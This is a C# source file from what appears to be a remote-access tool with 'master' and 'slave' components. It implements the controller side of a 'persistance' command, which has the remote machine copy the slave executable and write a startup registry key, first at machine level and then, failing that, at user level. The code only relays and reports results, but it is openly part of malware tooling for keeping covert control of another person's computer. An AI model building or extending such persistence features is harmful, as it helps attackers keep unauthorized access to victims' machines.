using System;
using System.Collections.Generic;
using System.Threading;
using Master.AdvancedConsole;
using Master.Commands.Core;
using Master.Core;
using Shared;

namespace Master.Commands
{
    internal class Persistance : IMasterCommand
    {
        public string name { get; } = "persistance";

        public string description { get; } = "Copy the slave executable and set a registry key allowing it to launch at startup";

        public bool isLocal { get; } = false;

        public static bool inProgress { get; set; } = false;

        public List<string> validArguments { get; } = new List<string>()
        {
            "?[newPath]"
        };

        public void Process(List<string> args)
        {
            if (GlobalCommandsManager.networkManager.ReadLine() == "KO")
            {
                ColorTools.WriteCommandError("Couldn't copy the slave executable to the specified location... Aborting");
                return;
            }
            ColorTools.WriteCommandSuccess($"Slave executable copied at {args[0]}");

            if (GlobalCommandsManager.networkManager.ReadLine() == "OK")
            {
                ColorTools.WriteCommandSuccess("Wrote startup registry key at machine level");
            }
            else
            {
                ColorTools.WriteCommandError("Couldn't write startup registry key at machine level : insufficient privileges");
                if (GlobalCommandsManager.networkManager.ReadLine() == "KO")
                {
                    ColorTools.WriteCommandError("Couldn't write startup registry key at current user level... Aborting");
                    return;
                }
                ColorTools.WriteCommandSuccess("Wrote startup registry key at current user level");
            }

            ColorTools.WriteCommandMessage("Please note that the non-persisted executable is still on the slave's machine and is still the one you are communicating with right now");
        }
    }
}
